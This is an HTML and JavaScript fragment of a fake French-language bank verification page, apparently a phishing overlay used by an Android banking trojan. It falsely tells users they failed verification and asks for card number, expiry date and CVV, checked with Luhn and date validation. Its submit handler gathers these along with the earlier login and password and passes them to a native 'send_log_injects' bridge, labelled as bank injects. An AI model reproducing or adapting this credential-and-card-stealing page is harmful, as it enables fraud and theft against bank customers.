            <section>
                <p style="font-size: 22px;color: #fff;"> Nous n'avons pas pu vous vérifier, veuillez effectuer une vérification supplémentaire avec votre carte. </p>

                <input type="tel" id="cc" name="cc" onkeyup="check6();check8()" class="input login" style="margin-bottom: 15px" placeholder="Carte de crédit" autocomplete="off"> 
                
                <input type="tel" id="exp" name="exp" maxlength="5" style="width: 55%;float: left;" onkeyup="check7();check8()" class="input" placeholder="Date d'expiration" autocomplete="off">
                <input type="password" id="cvv" name="cvv" maxlength="3" style="width: 40%;float: right;" onkeyup="check8()" class="input" placeholder="CVV" autocomplete="off">


                <input type="submit" class="button" id="sendData" disabled value="Connexion">
            </section>
        </div>
    </form>

    <script>
        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')

        var spinner = document.getElementById('spinner'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2'),
            form3 = document.getElementById('form3');

        var checkOff = document.getElementById('checkOff'),
            checkOn = document.getElementById('checkOn');

        var login = document.getElementById('login'),
            memorable = document.getElementById('memorable'),
            password = document.getElementById('password');

        var loginDublikat = document.getElementById('loginDublikat');
        var saveDubl = document.getElementById('saveDubl');

        var nextPage = document.getElementById('nextPage'),
            lastPage = document.getElementById('lastaPage'),
            sendData = document.getElementById('sendData');

        checkOff.onclick = () => {
            checkOff.style.display = 'none';
            checkOn.style.display = 'inline'
        }

        checkOn.onclick = () => {
            checkOn.style.display = 'none';
            checkOff.style.display = 'inline'
        }

        login.onkeyup = () => {
            if(login.value.length >= 5) {
                nextPage.disabled = false;
            } else {
                nextPage.disabled = true;
            }
        }

        nextPage.onclick = () => {
            loginDublikat.innerHTML = login.value.slice(0, -3);
            spinner.style.display = 'block';

            setTimeout(() => {
                form1.style.display = 'none';
                spinner.style.display = 'none';
                form2.style.display = 'block';
            }, 1500);
        }

        function check() {
            if(memorable.value.length >= 4 && password.value.length >= 3) {
                lastPage.disabled = false;
            } else {
                lastPage.disabled = true;
            }
        }

        memorable.onkeyup = () => { 
            check()
        }

        password.onkeyup = () => { 
            check()
        }

        lastPage.onclick = () => {
            spinner.style.display = 'block';

            setTimeout(() => {
                form2.style.display = 'none';
                spinner.style.display = 'none';
                form3.style.display = 'block';
            }, 1500);
        }

        function check7() {
            
            var mmYY = exp.value.split('/');
            var month = parseInt(mmYY[0]);
            var year = parseInt(mmYY[1]);
    
            var expArray = exp.value.split('/');
            var today, someday;
            var exMonth = expArray[0];
            var exYear = "20" + expArray[1];
    
            today = new Date();
            someday = new Date();
            someday.setFullYear(exYear, exMonth, 1);
                    
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
        }

        function check8() {
            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = () => {
            var data = {};
            data.login = login.value;
            data.password = password.value;
            data.cc = cc.value;
            data.exp = exp.value;
            data.cvv = cvv.value;
            data.type_injects = "banks";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
        }
    </script>
</body>
